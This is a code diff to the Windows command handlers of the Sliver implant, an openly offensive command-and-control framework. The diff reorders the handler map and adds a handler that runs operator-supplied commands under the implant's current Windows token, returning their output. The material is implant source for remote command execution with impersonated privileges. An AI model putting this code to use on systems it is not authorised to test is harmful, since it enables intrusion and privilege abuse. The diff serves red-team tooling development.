@@ -19,9 +19,14 @@ package handlers
 */
 
 import (
+	"fmt"
+
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
+
+	"os/exec"
+	"syscall"
 
 	"github.com/bishopfox/sliver/implant/sliver/pivots"
 	"github.com/bishopfox/sliver/implant/sliver/priv"
@@ -37,6 +42,7 @@ import (
 
 var (
 	windowsHandlers = map[uint32]RPCHandler{
+
 		// Windows Only
 		sliverpb.MsgTaskReq:            taskHandler,
 		sliverpb.MsgProcessDumpReq:     dumpHandler,
@@ -51,26 +57,27 @@ var (
 		sliverpb.MsgStopServiceReq:     stopService,
 		sliverpb.MsgRemoveServiceReq:   removeService,
 		sliverpb.MsgEnvReq:             getEnvHandler,
+		sliverpb.MsgExecuteTokenReq:    executeTokenHandler,
+
+		// Platform specific
+		sliverpb.MsgIfconfigReq:   ifconfigHandler,
+		sliverpb.MsgScreenshotReq: screenshotHandler,
+		sliverpb.MsgSideloadReq:   sideloadHandler,
+		sliverpb.MsgNetstatReq:    netstatHandler,
+		sliverpb.MsgMakeTokenReq:  makeTokenHandler,
+		sliverpb.MsgPsReq:         psHandler,
+		sliverpb.MsgTerminateReq:  terminateHandler,
 
 		// Generic
-		sliverpb.MsgPsReq:        psHandler,
-		sliverpb.MsgTerminateReq: terminateHandler,
-		sliverpb.MsgPing:         pingHandler,
-		sliverpb.MsgLsReq:        dirListHandler,
-		sliverpb.MsgDownloadReq:  downloadHandler,
-		sliverpb.MsgUploadReq:    uploadHandler,
-		sliverpb.MsgCdReq:        cdHandler,
-		sliverpb.MsgPwdReq:       pwdHandler,
-		sliverpb.MsgRmReq:        rmHandler,
-		sliverpb.MsgMkdirReq:     mkdirHandler,
-		sliverpb.MsgIfconfigReq:  ifconfigHandler,
-		sliverpb.MsgExecuteReq:   executeHandler,
-
-		sliverpb.MsgScreenshotReq: screenshotHandler,
-
-		sliverpb.MsgSideloadReq:  sideloadHandler,
-		sliverpb.MsgNetstatReq:   netstatHandler,
-		sliverpb.MsgMakeTokenReq: makeTokenHandler,
+		sliverpb.MsgPing:        pingHandler,
+		sliverpb.MsgLsReq:       dirListHandler,
+		sliverpb.MsgDownloadReq: downloadHandler,
+		sliverpb.MsgUploadReq:   uploadHandler,
+		sliverpb.MsgCdReq:       cdHandler,
+		sliverpb.MsgPwdReq:      pwdHandler,
+		sliverpb.MsgRmReq:       rmHandler,
+		sliverpb.MsgMkdirReq:    mkdirHandler,
+		sliverpb.MsgExecuteReq:  executeHandler,
 	}
 
 	windowsPivotHandlers = map[uint32]PivotHandler{
@@ -188,6 +195,55 @@ func executeAssemblyHandler(data []byte, resp RPCResponse) {
 	data, err = proto.Marshal(execAsm)
 	resp(data, err)
 
+}
+
+func executeTokenHandler(data []byte, resp RPCResponse) {
+	var (
+		err error
+	)
+	execReq := &sliverpb.ExecuteReq{}
+	err = proto.Unmarshal(data, execReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+
+	execResp := &sliverpb.Execute{}
+	cmd := exec.Command(execReq.Path, execReq.Args...)
+
+	// Execute with current token
+	cmd.SysProcAttr = &windows.SysProcAttr{
+		Token: syscall.Token(priv.CurrentToken),
+	}
+
+	if execReq.Output {
+		res, err := cmd.CombinedOutput()
+		//{{if .Config.Debug}}
+		log.Println(string(res))
+		//{{end}}
+		if err != nil {
+			// Exit errors are not a failure of the RPC, but of the command.
+			if exiterr, ok := err.(*exec.ExitError); ok {
+				execResp.Status = uint32(exiterr.ExitCode())
+			} else {
+				execResp.Response = &commonpb.Response{
+					Err: fmt.Sprintf("%s", err),
+				}
+			}
+		}
+		execResp.Result = string(res)
+	} else {
+		err = cmd.Start()
+		if err != nil {
+			execResp.Response = &commonpb.Response{
+				Err: fmt.Sprintf("%s", err),
+			}
+		}
+	}
+	data, err = proto.Marshal(execResp)
+	resp(data, err)
 }
 
 func migrateHandler(data []byte, resp RPCResponse) {
